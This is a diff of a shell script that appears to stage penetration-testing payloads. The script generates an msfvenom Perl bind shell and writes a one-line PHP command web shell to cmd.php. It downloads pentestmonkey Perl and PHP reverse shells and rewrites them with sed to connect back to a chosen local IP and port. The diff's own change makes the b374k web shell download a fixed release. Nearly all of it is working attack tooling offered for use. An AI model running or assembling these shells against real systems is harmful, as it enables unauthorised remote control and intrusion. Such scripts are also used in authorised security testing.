@@ -28,10 +28,12 @@ msfvenom -p cmd/unix/bind_perl LPORT=$port_remote -f raw > shell_bind_unix.pl
 
 echo '<?php system($_GET["cmd"]); ?>' > cmd.php
 
+rm pentestmonkey-perl-reverse-shell.pl
 wget https://raw.githubusercontent.com/pentestmonkey/perl-reverse-shell/master/perl-reverse-shell.pl -O pentestmonkey-perl-reverse-shell.pl
 sed -i "s/127.0.0.1/$ip_local/g" pentestmonkey-perl-reverse-shell.pl
 sed -i "s/1234/$port_local/g" pentestmonkey-perl-reverse-shell.pl
 
+rm pentestmonkey-php-reverse-shell.pl
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O pentestmonkey-php-reverse-shell.pl
 sed -i "s/127.0.0.1/$ip_local/g" pentestmonkey-php-reverse-shell.pl
 sed -i "s/1234/$port_local/g" pentestmonkey-php-reverse-shell.pl
@@ -40,13 +42,18 @@ sed -i "s/1234/$port_local/g" pentestmonkey-php-reverse-shell.pl
 #gcc -o findsock findsock.c
 #wget https://raw.githubusercontent.com/pentestmonkey/php-findsock-shell/master/php-findsock-shell.php -O pentestmonkey-php-findsock-reverse-shell.pl
 
-curl -s https://api.github.com/repos/b374k/b374k/releases/latest \
- | grep "zipball_url.*zip" \
- | cut -d : -f 2,3 \
- | tr -d \" \
- | tr -d , \
- | wget -qi -O b374k.zip -
-unzip b374k.zip -d b374k
-rm b374k.zip
-cp b374k/b374k.* .
-rm -rf b374k
+
+if [ ! -f b374k.php ]; then
+    wget https://github.com/b374k/b374k/archive/v3.2.3.zip
+    #TODO This fails sometimes due to API rate limiting
+    #curl -s https://api.github.com/repos/b374k/b374k/releases/latest \
+    # | grep "zipball_url.*zip" \
+    # | cut -d : -f 2,3 \
+    # | tr -d \" \
+    # | tr -d , \
+    # | wget -qi -O b374k.zip -
+    unzip v3.2.3.zip -d b374k
+    rm v3.2.3.zip
+    cp b374k/b374k.* .
+    rm -rf b374k
+fi
